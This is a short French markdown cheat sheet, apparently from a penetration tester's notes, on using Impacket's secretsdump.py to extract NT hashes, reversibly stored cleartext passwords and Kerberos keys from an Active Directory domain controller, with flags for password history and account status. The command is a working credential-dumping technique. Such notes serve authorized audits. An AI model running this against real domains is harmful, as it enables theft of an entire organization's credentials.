---
public: true # set to true to make the article publishable
---

## secretsdump

```shell
# génère 3 fichiers commencant par 'hashes' contenant :
# - les hasn LM:NT
# - les mots de passe stockés en clair (chifrrement réversible)
# - les clés kerberos
secretsdump.py -outputfile "hashes" -just-dc $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
```

On pourra utiliser en complément les paramètres suivants, principalement pour fournir des statistiques à un commanditaire :

- `-pwd-last-set` : stock également la date du dernier changement de mot de passe
- `-history` : collecte également les mots de passe précédents pour de potentielles comparaisons
- `-user-status` : stock également l'état du compte (désactivé ou non)
